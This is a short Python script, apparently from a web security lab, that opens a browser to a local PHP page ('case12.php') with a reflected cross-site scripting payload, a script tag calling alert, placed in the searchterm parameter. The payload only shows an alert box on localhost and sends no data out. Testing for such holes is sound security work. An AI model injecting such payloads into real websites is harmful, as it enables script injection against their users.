#alert cookie
import webbrowser
url = "http://localhost/5331/case12.php?searchterm=<script>alert('ok~!')</script>"
new = 2 #open in new window
webbrowser.open(url,new=new)
